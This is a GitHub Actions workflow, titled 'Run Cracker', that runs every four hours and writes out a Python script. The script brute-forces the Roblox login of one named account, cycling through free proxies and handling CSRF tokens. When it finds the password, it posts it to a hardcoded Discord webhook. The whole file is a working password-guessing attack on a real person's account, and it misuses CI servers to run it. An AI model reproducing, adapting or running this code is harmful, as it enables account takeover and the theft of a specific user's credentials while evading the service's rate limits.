name: Run Cracker
on:
  workflow_dispatch:
  schedule:
    - cron: '0 */4 * * *'

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'
          
      - name: Install dependencies
        run: pip install aiohttp
        
      - name: Run script
        run: |
          cat << 'EOF' > run.py
          import asyncio
          import aiohttp
          import random
          import string
          import re
          import os

          TARGET_USERNAME = "amirblox63"
          PASSWORD_LENGTH = 8
          PROGRESS_FILE = "progress.txt"
          WEBHOOK_URL = "https://discord.com/api/webhooks/1561439035803697242/Sz0yzODUD_Dywmd4JNc5nRC4c3iDh0eSSF4RPZaEuRD-QgnUTJ3BjAwVmP7SkM62Jatg"

          CONCURRENT_TASKS = 100 
          tried_passwords = set()
          proxy_list = []

          def load_progress():
              if os.path.exists(PROGRESS_FILE):
                  with open(PROGRESS_FILE, "r") as f:
                      for line in f:
                          tried_passwords.add(line.strip())

          def save_progress(password):
              with open(PROGRESS_FILE, "a") as f:
                  f.write(password + "\n")

          async def send_to_discord(session, content):
              try:
                  data = {"content": content, "username": "GitHub Cracker"}
                  await session.post(WEBHOOK_URL, json=data, timeout=10)
              except:
                  pass

          async def get_free_proxies(session):
              url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
              try:
                  async with session.get(url, timeout=10) as response:
                      if response.status == 200:
                          text = await response.text()
                          lines = text.strip().split('\n')
                          return [line.strip() for line in lines if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', line.strip())]
              except:
                  return []

          def generate_password():
              chars = string.ascii_letters + string.digits
              while True:
                  pwd = ''.join(random.choice(chars) for _ in range(PASSWORD_LENGTH))
                  if pwd not in tried_passwords:
                      tried_passwords.add(pwd)
                      save_progress(pwd)
                      return pwd

          async def check_account(session, password):
              proxy = random.choice(proxy_list) if proxy_list else None
              proxy_url = f"http://{proxy}" if proxy else None
              try:
                  async with session.post("https://auth.roblox.com/v2/login", json={"username": TARGET_USERNAME, "password": "dummy"}, proxy=proxy_url, timeout=5) as r1:
                      csrf = r1.headers.get("x-csrf-token")
                  if not csrf: return password, "PROXY_FAIL"
                  
                  headers = {"x-csrf-token": csrf}
                  async with session.post("https://auth.roblox.com/v2/login", json={"username": TARGET_USERNAME, "password": password}, headers=headers, proxy=proxy_url, timeout=5) as r2:
                      if r2.status == 200: return password, "SUCCESS"
                      elif r2.status == 403:
                          text = await r2.text()
                          if "captcha" in text.lower() or "challenge" in text.lower(): return password, "VERIFICATION"
                          return password, "FAILED"
                      return password, f"ERROR_{r2.status}"
              except:
                  return password, "TIMEOUT"

          async def worker(session, semaphore, stats, found_event):
              while not found_event.is_set():
                  async with semaphore:
                      pwd = generate_password()
                      _, status = await check_account(session, pwd)
                      stats['attempts'] += 1
                      if status == "SUCCESS":
                          found_event.set()
                          stats['found'] = pwd
                          break

          async def main():
              global proxy_list
              load_progress()
              
              async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=CONCURRENT_TASKS, ssl=False)) as session:
                  proxy_list = await get_free_proxies(session)
                  await send_to_discord(session, f"🚀 **بدأ التخمين على GitHub Actions!**\nالحساب: `{TARGET_USERNAME}`")

                  semaphore = asyncio.Semaphore(CONCURRENT_TASKS)
                  stats = {'attempts': 0, 'found': None}
                  found_event = asyncio.Event()
                  
                  tasks = [asyncio.create_task(worker(session, semaphore, stats, found_event)) for _ in range(CONCURRENT_TASKS)]
                  
                  while not found_event.is_set():
                      await asyncio.sleep(10)
                      if stats['attempts'] % 1000 == 0 and stats['attempts'] > 0:
                          print(f"[{stats['attempts']}] attempts done...")

                  for task in tasks: task.cancel()
                  
                  if stats['found']:
                      await send_to_discord(session, f"🎉 **تم إيجاد الباسورد!**\nالحساب: `{TARGET_USERNAME}`\nالباسورد: `{stats['found']}`")

          asyncio.run(main())
          EOF
          python run.py
